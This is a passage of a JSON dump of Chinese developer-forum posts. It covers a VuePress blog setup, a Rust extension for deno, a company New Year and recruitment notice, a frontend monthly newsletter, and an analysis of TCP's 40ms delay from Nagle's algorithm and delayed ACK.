&#x27;查看原文|编辑此页&#x27;,\n\n    nav,\n    sidebar,\n  },\n}\n</code></pre><h3>侧边栏效果</h3>\n<p>访问： <strong><a href=\"http://localhost:8080/readme-blog/WEB/Vue/vuepress-blog.html\">http://localhost:8080/readme-blog/WEB/Vue/vuepress-blog.html</a></strong>， 可以看到侧边栏已经生成</p>\n<h2>将静态博客网站部署到外网</h2>\n<p>使用 <strong>gh-pages</strong> 进行项目部署</p>\n<pre class=\"prettyprint language-sh\"><code>npm run deploy\n</code></pre><p>过几分钟后，访问 <strong><a href=\"https://zhb333.github.io/readme-blog/\">https://zhb333.github.io/readme-blog/</a></strong>， 便可以看到在外网成功部署的静态博客</p>\n<h2>评论功能</h2>\n<p>我们使用 <strong>valine</strong> 来实现评论功能：</p>\n<blockquote>\n<p>Valine - 一款快速、简洁且高效的无后端评论系统。</p>\n</blockquote>\n<p><strong>点击进入 <a href=\"https://valine.js.org/quickstart.html\" title=\"Valine\">Valine官网</a> ，需要先注册才能食用</strong></p>\n<h3>安装 Valine</h3>\n<pre class=\"prettyprint language-sh\"><code># Install leancloud&#x27;s js-sdk\nnpm install leancloud-storage --save\n\n# Install valine\nnpm install valine --save\n</code></pre><h3>注册 vuepress 全局组件</h3>\n<p>创建 <strong>.vuepress/components/Valine.vue</strong></p>\n<pre class=\"prettyprint language-html\"><code>&lt;template&gt;\n  &lt;div id=&quot;vcomments&quot;&gt;&lt;&#x2F;div&gt;\n&lt;&#x2F;template&gt;\n\n&lt;script&gt;\nexport default {\n  name: &#x27;Valine&#x27;,\n  mounted: function(){\n    &#x2F;&#x2F; require window \n    const Valine = require(&#x27;valine&#x27;);\n    if (typeof window !== &#x27;undefined&#x27;) {\n      this.window = window\n      window.AV = require(&#x27;leancloud-storage&#x27;)\n      \n    }\n     \n    new Valine({\n      el: &#x27;#vcomments&#x27; ,\n      appId: &#x27;&#x27;,&#x2F;&#x2F; your appId\n      appKey: &#x27;&#x27;, &#x2F;&#x2F; your appKey\n      notify:false, \n      verify:false, \n      avatar:&#x27;mm&#x27;, \n      placeholder: &#x27;just go go&#x27; \n    });\n  },\n}\n&lt;&#x2F;script&gt;\n</code></pre><h3>使用 Valine</h3>\n<p>只需要在 <strong>markdown</strong> 中调用即可</p>\n<pre class=\"prettyprint language-md\"><code>&lt;Valine&gt;&lt;&#x2F;Valine&gt;\n</code></pre></div>","title":"Vuepress 搭建带评论功能的静态博客","last_reply_at":"2019-02-02T01:36:24.140Z","good":false,"top":false,"reply_count":6,"visit_count":1557,"create_at":"2018-11-17T17:22:19.364Z","author":{"loginname":"zhb333","avatar_url":"https://avatars2.githubusercontent.com/u/26917599?v=4&s=120"}},{"id":"5c540e3b05cc322e7b136eea","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p>这篇文章主要接着 <a href=\"https://github.com/zy445566/myBlog/blob/master/20190125deno/20190125build/README.md\">《编译deno，deno结构解析》</a>作的第二篇，由于deno目标是给提供像浏览器一样的安全的环境，但是如果你需要在后端实现一些deno不方便实现的东西，你要如何做呢？那为什么我们不能给deno做一个扩展呢？我们就以做一个计算斐波那契数列的方法做一个deno做rust扩展的例子。</p>\n<h1>第一步：定义消息类型</h1>\n<p>上篇文章目录解析说到，deno是通过中间层使得v8和rust互相调用，那么v8是c++写的，rust又是另一门语言，那需要通讯要怎么怎么做呢？deno使用很常规的类似RPC来调用，只不过去掉了r。使用过thrift和grpc的同学都知道如果要实现多语言通讯实际上是要互相定义类型，deno也不例外，只不过使用的是flatbuffers，这里有兴趣自行学习。</p>\n<p>所以我们第一步定义类型：</p>\n<ul>\n<li>在src/msg.fbs中增加GetFibo和GetFiboRes两种类型，类型名字可以随便取，代码如下</li>\n</ul>\n<pre class=\"prettyprint language-fbs\"><code>union Any {\n  Start,\n  ...\n  GetFibo,\n  GetFiboRes\n}\n\ntable GetFibo {\n  num: int32;\n}\n\ntable GetFiboRes {\n  result: int32;\n}\n</code></pre><p>什么意思呢？你可以这样认为GetFibo就是定义了我传入的参数列表类型，GetFiboRes则是定义了返回值的类型。而我们要做计算斐波那契数列的方法，那么参数只有一个数字，结果也只有一个数字，所以将我们都只要定义一个数字类型就好。</p>\n<p>写好后，我们可以编译一下</p>\n<pre class=\"prettyprint language-sh\"><code>.&#x2F;tools&#x2F;build.py \n# 生成target&#x2F;debug&#x2F;gen&#x2F;msg_generated.ts，这个我们后面要用到\n</code></pre><h1>第二步：建立与rust进行通讯的方法和ts的方法定义</h1>\n<ul>\n<li>新建一个文件js/get_fibo.ts，代码如下</li>\n</ul>\n<pre class=\"prettyprint language-ts\"><code>import * as msg from &quot;gen&#x2F;msg_generated&quot;;\nimport * as flatbuffers from &quot;.&#x2F;flatbuffers&quot;;\nimport { assert } from &quot;.&#x2F;util&quot;;\nimport * as dispatch from &quot;.&#x2F;dispatch&quot;;\n\nfunction req(\n    num: number,\n  ): [flatbuffers.Builder, msg.Any, flatbuffers.Offset] {\n    const builder = flatbuffers.createBuilder();\n    msg.GetFibo.startGetFibo(builder);\n    msg.GetFibo.addNum(builder, num);\n    const inner = msg.GetFibo.endGetFibo(builder);\n    return [builder, msg.Any.GetFibo, inner];\n  }\n  \n  function res(baseRes: null | msg.Base): number {\n    assert(baseRes !== null);\n    assert(msg.Any.GetFiboRes === baseRes!.innerType());\n    const res = new msg.GetFiboRes();\n    assert(baseRes!.inner(res) !== null);\n    return res.result();\n  }\n\n\nexport function getFiboSync(num: number): number {\n    return res(dispatch.sendSync(...req(num)));\n}\n  \n\nexport async function getFibo(num: number): Promise&lt;number&gt; {\n    return res(await dispatch.sendAsync(...req(num)));\n}\n</code></pre><p>作下说明：</p>\n<ul>\n<li>gen/msg_generated 就是我们之前生成的数据类型定义</li>\n<li>flatbuffers 用来产生协议数据的工具</li>\n<li>assert 检测数据是否异常的工具</li>\n<li>dispatch 发送数据通讯的方法</li>\n</ul>\n<p>此外如果我们只需要写js而不需要通讯rust的话，其实就也不需要引用这些库了，直接在getFiboSync和getFibo写方法就好了。这个文件ts主要用途就是和rust交互用的，同时定义下要暴露的ts方法，req方法是组转要发送的数据结构，res则是处理接收回来的消息，dispatch发送数据。</p>\n<p><code>注</code>：getFiboSync和getFibo 分别代表同步方法和异步方法</p>\n<h1>增加rust方法</h1>\n<p>在src/ops.rs增加方法，这里的方法也主要是接收和数据组装,代码如下：</p>\n<pre class=\"prettyprint language-rs\"><code>...\nlet op_creator: OpCreator = match inner_type {\n      msg::Any::Accept =&gt; op_accept,\n      msg::Any::Chdir =&gt; op_chdir,\n      ...\n      msg::Any::GetFibo =&gt; op_get_fibo &#x2F;&#x2F;增加我们的方法\n      _ =&gt; panic!(format!(\n        &quot;Unhandled message {}&quot;,\n        msg::enum_name_any(inner_type)\n      )),\n...\nfn op_get_fibo(\n  _state: &amp;Arc&lt;IsolateState&gt;,\n  base: &amp;msg::Base&lt;&#x27;_&gt;,\n  data: libdeno::deno_buf,\n) -&gt; Box&lt;Op&gt; {\n  assert_eq!(data.len(), 0);\n  let inner = base.inner_as_get_fibo().unwrap();\n  let cmd_id = base.cmd_id();\n  let num = inner.num();\n\n  blocking(base.sync(), move || -&gt; OpResult {\n    &#x2F;&#x2F; 计算fibonacci数列\n    let sqrt5 = 5_f64.sqrt();\n    let c1 = (1.0_f64+sqrt5)&#x2F;2.0_f64;\n    let c2 = (1.0_f64-sqrt5)&#x2F;2.0_f64;\n    let result_f = (sqrt5&#x2F;5.0_f64)*(c1.powi(num)-c2.powi(num));\n    let result = result_f as i32;\n\n    let builder = &amp;mut FlatBufferBuilder::new();\n    let inner = msg::GetFiboRes::create(\n      builder,\n      &amp;msg::GetFiboResArgs {\n        result, \n      },\n    );\n\n    Ok(serialize_response(\n      cmd_id,\n      builder,\n      msg::BaseArgs {\n        inner: Some(inner.as_union_value()),\n        inner_type: msg::Any::GetFiboRes,\n        ..Default::default()\n      },\n    ))\n  })\n}\n...\n</code></pre><p>这里稍微解释一下rust的match在这里的意思，你可以理解为一个增强版的switch，就是GetFibo的数据类型过来的话，就执行op_get_fibo方法，而op_get_fibo主要是在封装FlatBufferBuilder数据，而真正有效计算斐波那契数列的代码其实就一点，当然如果功能代码量大则可以新建一个rust文件来搞，如下：</p>\n<pre class=\"prettyprint language-rs\"><code>    let sqrt5 = 5_f64.sqrt();\n    let c1 = (1.0_f64+sqrt5)&#x2F;2.0_f64;\n    let c2 = (1.0_f64-sqrt5)&#x2F;2.0_f64;\n    let result_f = (sqrt5&#x2F;5.0_f64)*(c1.powi(num)-c2.powi(num));\n    let result = result_f as i32;\n</code></pre><h1>最后一步</h1>\n<p>其实到这里链路就算彻底打通了，我们只差最后一步，把我们的方法暴露出来</p>\n<ul>\n<li>修改js/deno.ts文件，把get_fibo.ts的方法暴露出去即可</li>\n</ul>\n<pre class=\"prettyprint language-ts\"><code>...\nexport { getFiboSync, getFibo } from &quot;.&#x2F;get_fibo&quot;;\n...\n</code></pre><p>编译之后就搞定了</p>\n<pre class=\"prettyprint language-sh\"><code>.&#x2F;tools&#x2F;build.py \n</code></pre><p>测试代码如下：</p>\n<pre class=\"prettyprint language-ts\"><code>import * as deno from &quot;deno&quot;;\n\n(async()=&gt;{\n    console.log(deno.getFiboSync(10));\n    console.log(await deno.getFibo(11));\n})();\n</code></pre><p>其实在上一篇我也有讲到，学习deno就是学习一个库，相信看过测试代码就知道原因了。</p>\n<h1>结语</h1>\n<p>这次应该真的是过年前的最后一篇。</p>\n</div>","title":"deno系列第二篇，给deno做rust扩展","last_reply_at":"2019-02-01T11:11:37.338Z","good":false,"top":false,"reply_count":2,"visit_count":920,"create_at":"2019-02-01T09:15:39.341Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"5c54257205cc322e7b136f36","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><p>Hi，大家好，我是AI考拉的形象大使，考拉拉。<br>\n在这里先给大家拜个早年~！<br>\n2018年，走得跌跌宕宕：赶上了个税起征点调高好机会，也迎来了互联网裁员洗牌的时机；</p>\n<p>见证了马云从阿里巴巴卸任CEO的时刻，也目睹了ofo摩拜等独角兽的没落；</p>\n<p>2019年，注定是风起云涌的一年。新的启程，新的起点，考拉拉送上真挚的猪年祝福，愿你：</p>\n<p>工作顺心，少遇Bug，多涨薪；</p>\n<p>身体健康，撸得了铁，搬得好砖；</p>\n<p>阖家欢乐，喜遇良人，笑不拢嘴；</p>\n<p>福气来临，良机闪现，喜攀高峰。</p>\n<p>新的一年，愿你带着祝福继续前进！若有新的工作想法，欢迎找AI考拉，我们广招贤士，希望能够与你一同前行，共同携手奋斗。</p>\n<p>关于公司职位更多情况，详情请点击AI考拉拉勾主页：<a href=\"https://www.lagou.com/gongsi/35507.html\">https://www.lagou.com/gongsi/35507.html</a></p>\n<p>也可通过公司邮箱递交个人简历：jobs@kalengo.com</p>\n<p>公司详细介绍欢迎戳：AI考拉官网</p>\n</div>","title":"广州财略金融（AI考拉）2019新年祝福","last_reply_at":"2019-02-01T10:54:42.455Z","good":false,"top":false,"reply_count":0,"visit_count":1049,"create_at":"2019-02-01T10:54:42.455Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c53c15de6aaad2ea76de6d5","author_id":"581ae153e90cfbec054d762a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>订阅 / 投稿：<a href=\"https://github.com/txd-team/monthly\">https://github.com/txd-team/monthly</a>\n本期小编：<a href=\"https://github.com/x-cold\">x-cold (尹挚)</a></p>\n</blockquote>\n<h3>新闻快报</h3>\n<h4>重磅消息：Github 宣布<a href=\"https://github.com/pricing\">私有仓库免费</a>，同期还上线了<a href=\"https://github.com/topics\">星标话题</a> (topics) 的功能</h4>\n<p>2019 年伊始，GitHub 正式宣布开放无限制创建私有存储库，并开始提供统一的企业版 GitHub 服务，微软正在开始加速 toB 企业服务的布局。开发者们一片叫好声，可谓年度最佳的程序员福利了。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/103147/1548992494868-94cd1a37-2454-40cd-90bb-7d90c3ad001a.png#align=left&amp;display=inline&amp;height=331&amp;linkTarget=_blank&amp;originHeight=1008&amp;originWidth=1312&amp;width=431\" alt></p>\n<h4>软件技术 B2B 公司 <a href=\"https://www.idera.com/\">Idera.inc</a> 收购 Travis CI</h4>\n<p>Travis CI 将结合 Idera 公司其本身的数据库 / 开发者 / 测试等工具发挥更大的商业优势。不过使用免费版的社区同学也不用紧张，<strong>Travis CI 依然保证对开源软件免费的策略，并且其开源证书不会修改 (MIT)</strong>，更多可以参考详细的<a href=\"https://blog.travis-ci.com/2019-01-23-travis-ci-joins-idera-inc\">官方公告</a>。</p>\n<blockquote>\n<p>需要额外提醒的是, Travis-CI 对 Github 私有仓库依然没有提供免费的服务。</p>\n</blockquote>\n<h4>ES2019 即将到来，<a href=\"https://github.com/tc39/proposals/blob/master/finished-proposals.md\">新特性</a>快速一览</h4>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/103147/1548992506585-4f3bff27-7235-455e-9808-93e2aad54b1a.png#align=left&amp;display=inline&amp;height=752&amp;linkTarget=_blank&amp;name=image.png&amp;originHeight=2339&amp;originWidth=1080&amp;size=747066&amp;width=347\" alt=\"image.png\"></p>\n<h4>越来越多的项目开始迁移到 TypeScript</h4>\n<p>MemSQL Studio 的 3W+ 行前端源代码从 Flow 迁移到 TypeScript，主要目的是加强类型的控制，避免动态/弱类型造成运行时的各种问题。官方总结了一篇<a href=\"https://davidgom.es/porting-30k-lines-of-code-from-flow-to-typescript/\">文章</a>，介绍了他们为什么要迁移到 TypeScript，以及迁移过程的记录。</p>\n<p>Fackbook 开源的测试框架 <a href=\"https://github.com/facebook/jest\">Jest</a> 通过几番的讨论终于从 JavaScript 迁移到使用 TypeScript 构建整个项目了，详细的过程可以查看<a href=\"https://github.com/facebook/jest/pull/7554\">关联的 Pull Request</a>。</p>\n<p>1 月 25 日，Yarn 官方团队在 GitHub issue 中宣布将对 Yarn 进行<a href=\"https://github.com/yarnpkg/yarn\">重大更改</a>，主要包括：将代码库从 Flow 移植到 TypeScript，不再支持 Node 4 和 Node 6，并为 Yarn 新增了一些功能等，这个更改项目代号为 Berry，目的是增强 Yarn 优势，弥补弱势。(本条消息来自 <a href=\"https://www.infoq.cn/article/eaRb-EzTimF4kfy4dsg7\">InfoQ</a>)</p>\n<h4>Midway v1.0 社区</h4>\n<p><a href=\"https://github.com/midwayjs/midway\">Midway</a> 是一款基于 Egg 和 TypeScript 的 Web 开发框架，由来自淘宝的 MidwayJS 团队开发。用户可以使用丰富的装饰器快速开发，并且引入了 IoC 的概念，统一管理依赖和统一初始化，是一款面向未来的全栈开发方案。</p>\n<h4>JavaScript 成为 2018 年最受欢迎的编程语言</h4>\n<p>随着前端领域的迅猛发展，JavaScript 语言已经延伸到更丰富的使用场景中，HackerRank 在社区发起了 2018 年度的开发者调查，其中就包含了编程语言和框架。<a href=\"https://mp.weixin.qq.com/s/buLIpFVHkBb9tYReQyBZlA\">调查结果</a>显示：JavaScript 在 2018 年度荣获最受欢迎的编程语言。</p>\n<h4>简要讯息</h4>\n<ul>\n<li>npm package <a href=\"https://anvaka.github.io/pm/#/galaxy/npm?cx=-1345&amp;cy=-7006&amp;cz=-6553&amp;lx=0.6217&amp;ly=-0.6459&amp;lz=0.3098&amp;lw=0.3168&amp;ml=150&amp;s=1.75&amp;l=1&amp;v=2018-11-02T00-00-00Z\">可视化视角</a>，你能找到你发过的 npm 包吗？</li>\n<li>「墨者修齐」2018 年可视化<a href=\"https://www.yuque.com/mo-college/weekly/ny35wg\">年度总结</a>，介绍了各种场景下的可视化产品。</li>\n<li><a href=\"https://seeconf.antfin.com/\">SSE Conf</a> 2019 顺利举行，会议相关资料包<a href=\"https://www.yuque.com/seeconf/content/kbnzac\">下载</a></li>\n<li>第十三届 <a href=\"http://d2forum.alibaba-inc.com/\">D2 前端技术论坛</a>在杭州举行，精彩回顾 <a href=\"https://www.yuque.com/d2forum/content/d213\">大合集</a></li>\n</ul>\n<h3>Github Trending</h3>\n<blockquote>\n<p>洞察 Github 近期 Hot Fresh Repository</p>\n</blockquote>\n<ul>\n<li><a href=\"https://github.com/alibaba/flutter-go\">flutter-go</a></li>\n</ul>\n<p><a href=\"https://github.com/flutter/flutter\">flutter</a> 开发者帮助 APP，包含 flutter 常用 140+ 组件的demo 演示与中文文档，帮助开发者快速上手 Flutter 内部测试中，1.0 正式版将于 2月 20日 发布。</p>\n<ul>\n<li><a href=\"https://github.com/zadam/trilium\">trilium</a></li>\n</ul>\n<p>Trilium Notes 是一款知识库构建工具，支持无限层级扩展，文档可以挂载到多个节点上，采用所见即所得的编辑方式。体验上个人感觉有点像桌面版本的语雀。</p>\n<ul>\n<li><a href=\"https://github.com/chokcoco/CSS-Inspiration\">CSS-Inspiration</a></li>\n</ul>\n<p>国服第一切图仔 <a href=\"https://github.com/chokcoco\">chokcoco</a> 整理的各种 CSS 技巧，帮助学习 CSS 和寻找灵感，以分类的形式，展示不同 CSS 属性或者不同的课题使用 CSS 来解决的各种方法。<a href=\"https://github.com/chokcoco/CSS-Inspiration#%E5%9C%A8%E7%BA%BF%E9%A2%84%E8%A7%88\"></a></p>\n<ul>\n<li><a href=\"https://github.com/nukeop/nuclear\">nuclear</a></li>\n</ul>\n<p>一款高颜值的流媒体资源音乐🎵播放器，支持网络上所有免费的流媒体资源。</p>\n<ul>\n<li><a href=\"https://github.com/auchenberg/vscode-browser-preview\">vscode-browser-preview</a></li>\n</ul>\n<p>一款“带给我惊喜”的 vscode 插件，提供给给编辑器实时预览页面的能力，可以将 vscode 打造成更强大的集成开发环境 (IDE) 了。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/gif/103147/1548992552938-9984fbf1-2e70-4da4-aee2-12b1a68d05d7.gif#align=left&amp;display=inline&amp;height=452&amp;linkTarget=_blank&amp;name=1548992494875-b282cb53-c06d-40f1-ae4c-d142837e5377.gif&amp;originHeight=858&amp;originWidth=1416&amp;size=2200095&amp;width=746\" alt=\"1548992494875-b282cb53-c06d-40f1-ae4c-d142837e5377.gif\"></p>\n<h3>精品学习</h3>\n<h4>TypScript 学习指导</h4>\n<p>TypeScript 最近可谓如火如，它是 JavaScript 的超集，其最大的特点就是支持了类型系统。其火爆的中最核心的推动力无非是前端工程规模的增长，覆盖端 (服务端 node / deno、移动端等)的扩展，学习和使用 TypeScript 能够让我们更轻松地应付一些复杂的开发场景。</p>\n<ul>\n<li>理解类型系统，推荐初级读物 <a href=\"https://www.cs.uaf.edu/users/chappell/public_html/class/2018_spr/cs331/docs/types_primer.html\">《A primer of type system》</a></li>\n<li>入门 TypeScript 语言，参阅官网文档<a href=\"http://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes.html\">英文原版</a> /<a href=\"https://www.tslang.cn/docs/handbook/typescript-in-5-minutes.html\"> 中文译版</a></li>\n<li>实践参考项目 (starter)\n<ul>\n<li><a href=\"https://github.com/Microsoft/TypeScript-Node-Starter\">TypeScript-Node-Starter</a></li>\n<li><a href=\"https://github.com/Microsoft/TypeScript-React-Starter\">TypeScript-React-Starter</a></li>\n<li><a href=\"https://github.com/Microsoft/TypeScript-Vue-Starter\">TypeScript-Vue-Starter</a></li>\n<li>大家猜猜为啥没有列出 <a href=\"https://angular.io/\">Angular</a> ???</li>\n</ul>\n</li>\n</ul>\n<h4>「墨者修齐」数据可视化<a href=\"https://www.yuque.com/mo-college/weekly\">周刊</a></h4>\n<p>精选文章推荐，可视化入门与进阶权威网站、论文、工具介绍，工程与设计实践分享，2019 年起每周一更新。</p>\n<h4>Development 技术播客<a href=\"https://github.com/rShetty/awesome-podcasts#web-development\">列表</a></h4>\n<p>涵盖了开发相关的方方面面，包括编程语言、AI、Devops、Web 开发等丰富的课程体系。</p>\n<h4>Flutter-learning</h4>\n<p><a href=\"https://github.com/AweiLoveAndroid/Flutter-learning\">Flutter-learning</a> 整理了 Flutter 相关学习资料，包括 Flutter安装和配置，Flutter开发遇到的难题，Flutter示例代码和模板，Flutter项目实战，Dart语言学习示例代码。</p>\n<h3>工具推荐</h3>\n<ul>\n<li><a href=\"https://projects.lukehaas.me/runjs/\">RunJS</a></li>\n</ul>\n<p>一款可以随手验证你的想法的桌面应用程序，输入 JS 代码片段既可预览执行结果，支持最新的 ES 特性。(PS: 也可以用来当做代码片段备忘录)</p>\n<ul>\n<li><a href=\"https://www.image-map.net/\">image-map</a></li>\n</ul>\n<p>在线生成 image maps 的可视化工具，如果你想要绘制简单的局部可交互地图、编写邮件时希望添加链接到图片指定区块上，不妨通过 image maps 这项古老悠久的技术来实现，image-map 是一款在线进行可视化编辑，生成对应的 map / area 代码的工具。</p>\n<ul>\n<li><a href=\"https://github.com/mjmlio/mjml\">mjml</a></li>\n</ul>\n<p>mjml 是一种用于创建响应式的邮件的标记语言，通过编写语义化的标签，会自动帮助你转换成标准的 html 的代码，并且使用了 table 进行布局，非常适合编写富文本邮件。如果有这方面的需求，不妨进一步试试桌面版的 <a href=\"http://mjmlio.github.io/mjml-app/\">mjml-app</a> 吧。</p>\n<ul>\n<li><a href=\"https://github.com/Eugeny/terminus\">terminus</a></li>\n</ul>\n<p>支持 windows，linux，macos 三端的命令行工具，集成的SSH客户端和连接管理器，可定制化程度非常高。</p>\n<h3>其他</h3>\n<p>最近在 Reddit 看到的前端 vs 后端的一些<a href=\"https://github.com/txd-team/monthly/issues/24\">对比图</a>，“很是真实”，献上给大家。</p>\n<p>各位客官猪年大吉呀🌺🌺🌺，祝福新一年里猪事顺利！！！ 另外 2020 年毕业的同学别忘了准备阿里巴巴春季实习生招聘哈，需要内推的同学也可以提前发送附件简历到我的邮箱。</p>\n<h3>附录</h3>\n<ul>\n<li><a href=\"https://github.com/shengxinjing/programmer-job-blacklist\">《</a><a href=\"https://github.com/shengxinjing/programmer-job-blacklist\">程序员找工作黑名单</a><a href=\"https://github.com/shengxinjing/programmer-job-blacklist\">》</a></li>\n</ul>\n</div>","title":"前端小报 - 201901 月刊","last_reply_at":"2019-02-01T06:33:55.889Z","good":false,"top":false,"reply_count":1,"visit_count":878,"create_at":"2019-02-01T03:47:41.419Z","author":{"loginname":"x-cold","avatar_url":"https://avatars1.githubusercontent.com/u/6903313?v=4&s=120"}},{"id":"5c20b40476c4964062a1d3f1","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>TCP是一个复杂的协议，每个机制在带来优势的同时也会引入其他的问题。 Nagel算法和delay ack机制是减少发送端和接收端包量的两个机制， 可以有效减少网络包量，避免拥塞。但是，在特定场景下， Nagel算法要求网络中只有一个未确认的包， 而delay ack机制需要等待更多的数据包， 再发送ACK回包， 导致发送和接收端等待对方发送数据， 造成死锁， 只有当delay ack超时后才能解开死锁，进而导致应用侧对外的延时高。 其他文字已经介绍了相关的机制， 已经有一些文章介绍这种时延的场景。本文结合具体的tcpdump包，分析触发delay ack的场景，相关的内核参数， 以及规避的方案。</p>\n<h1>背景</h1>\n<p>给redis加了一个proxy层， 压测的时候发现， 对写入命令，数据长度大于2k后， 性能下降非常明显， 只有直连redis-server的1/10.  而get请求影响并不是那么明显。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208730298_3099_1498208730530.png\" alt=\"img\"></p>\n<h1>分析</h1>\n<p>观察系统的负载和网络包量情况， 都比较低， 网络包量也比较小， proxy内部的耗时也比较短。 无赖只能祭出tcpdump神奇， 果然有妖邪。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208737791_7723_1498208737959.png\" alt=\"img\"></p>\n<p>22号tcp请求包， 42ms后服务端才返回了ack。 初步怀疑是网络层的延时导致了耗时增加。Google和km上找资料， 大概的解释是这样： 由于客户端打开了Nagel算法， 服务端未关闭延迟ack， 会导致延迟ack超时后，再发送ack，引起超时。</p>\n<h1>原理</h1>\n<p>Nagel算法，转自维基百科</p>\n<pre class=\"prettyprint language-js\"><code>if there is new data to send\n\n  if the window size &gt;= MSS and available data is &gt;= MSS\n\n    send complete MSS segment now\n\n  else\n\n    if there is unconfirmed data still in the pipe\n\n      enqueue data in the buffer until an acknowledge is received\n\n    else\n\n      send data immediately\n\n    end if\n\n  end if\n\nend if\n</code></pre><p>简单讲， Nagel算法的规则是：</p>\n<ol>\n<li>如果发送内容大于1个MSS， 立即发送；</li>\n<li>如果之前没有包未被确认， 立即发送；</li>\n<li>如果之前有包未被确认， 缓存发送内容；</li>\n<li>如果收到ack， 立即发送缓存的内容。</li>\n</ol>\n<p>延迟ACK的源码如下：<code>net/ipv4/tcp_input.c</code></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208743244_8806_1498208743427.png\" alt=\"img\"></p>\n<p>基本原理是：</p>\n<ol>\n<li>如果收到的数据内容大于一个MSS， 发送ACK；</li>\n<li>如果收到了接收窗口以为的数据， 发送ACK；</li>\n<li>如果处于quick mode， 发送ACK；</li>\n<li>如果收到乱序的数据， 发送ACK；</li>\n<li>其他， 延迟发送ACK</li>\n</ol>\n<p>其他都比较明确， quick mode是怎么判断的呢？ 继续往下看代码：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208749137_5761_1498208749314.png\" alt=\"img\"></p>\n<p>影响quick mode的一个因素是 ping pong的状态。 Pingpong是一个状态值， 用来标识当前tcp交互的状态， 以预测是否是W-R-W-R-W-R这种交互式的通讯模式， 如果处于， 可以用延迟ack， 利用Read的回包， 将Write的回包， 捎带给发送方。</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/9e45473d5d2dd9a9f255fedc13ec5b32/image.png\" alt=\"img\"></p>\n<p>如上图所示， 默认pingpong = 0， 表示非交互式的， 服务端收到数据后， 立即返回ACK， 当服务端有数据响应时，服务端将pingpong = 1， 以后的交互中， 服务端不会立即返回ack，而是等待有数据或者ACK超时后响应。</p>\n<h1>问题</h1>\n<p>按照前面的的原理分析，应该每次都有ACK延迟的，为什么我们测试小于2K的数据时， 性能并没有受到影响呢？</p>\n<p>继续分析tcpdump包：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208911903_9965_1498208912406.png\" alt=\"img\"></p>\n<p>按照Nagel算法和延迟ACK机制， 上面的交互如下图所示， 由于每次发生的数据都包含了完整的请求， 服务端处理完成后， 向客户端返回命令响应时， 将请求的ACK捎带给客户端，节约一次网络包。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208919657_6568_1498208919815.png\" alt=\"img\"></p>\n<p>再分析2K的场景：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208928413_1775_1498208928668.png\" alt=\"img\"></p>\n<p>如下表所示， 第22个包发送的数据小于MSS， 同时，pingpong = 1， 被认为是交互模式， 期待通过捎带ACK的方式来减少网络的包量。 但是， 服务端收到的数据，并不是一个完整的包，不能产生一次应答。服务端只能在等待40ms超时后，发送ACK响应包。</p>\n<p>同时，从客户端来看，如果在发送一个包， 也可以打破已收数据 &gt; MSS的限制。 但是，客户端受Nagel算法的限制， 一次只能有一个包未被确认，其他的数据只能被缓存起来， 等待发送。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208934031_1371_1498208934204.png\" alt=\"img\"></p>\n<h1>触发场景</h1>\n<p>一次tcp请求的数据， 不能在服务端产生一次响应，或者小于一个MSS</p>\n<h1>规避方案</h1>\n<p>只有同时客户端打开Nagel算法， 服务端打开tcp_delay_ack才会导致前面的死锁状态。 解决方案可以从TCP的两端来入手。</p>\n<h2>服务端：</h2>\n<ol>\n<li>关闭tcp_delay_ack, 这样， 每个tcp请求包都会有一个ack及时响应， 不会出现延迟的情况。 操作方式： echo 1 &gt; /proc/sys/net/ipv4/tcp_no_delay_ack 但是， 每个tcp请求都返回一个ack包， 导致网络包量的增加，关闭tcp延迟确认后， 网络包量大概增加了80%，在高峰期影响还是比较明显。</li>\n</ol>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1498208940270_952_1498208940500.png\" alt=\"img\"></p>\n<p>2.设置TCP_QUICKACK属性。 但是需要每次recv后再设置一次。 对应我们的场景不太适合，需要修改服务端redis源码。</p>\n<h2>客户端：</h2>\n<ol>\n<li>关闭nagel算法，即设置socket tcp_no_delay属性。<code>static</code> <code>void _set_tcp_nodelay(int fd) { int enable = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (void*)&amp;enable, sizeof(enable)); }</code></li>\n<li>避免多次写， 再读取的场景， 合并成一个大包的写；避免一次请求分成多个包发送， 最开始发送的包小于一个MSS，对我们的场景， 把第22号包的1424个字节缓存起来， 大于一个MSS的时候，再发送出去， 服务端立即返回响应， 客户端继续发送后续的数据， 完成交互，避免时延。</li>\n</ol>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"我们来说一说TCP神奇的40ms","last_reply_at":"2019-02-01T06:07:22.036Z","good":false,"top":false,"reply_count":4,"visit_count":1365,"create_at":"2018-12-24T10:25:08.709Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c0620c4d3b8ab334e8da79e","author_id":"550973933135610a365b01fa","tab":"share","content":"<div 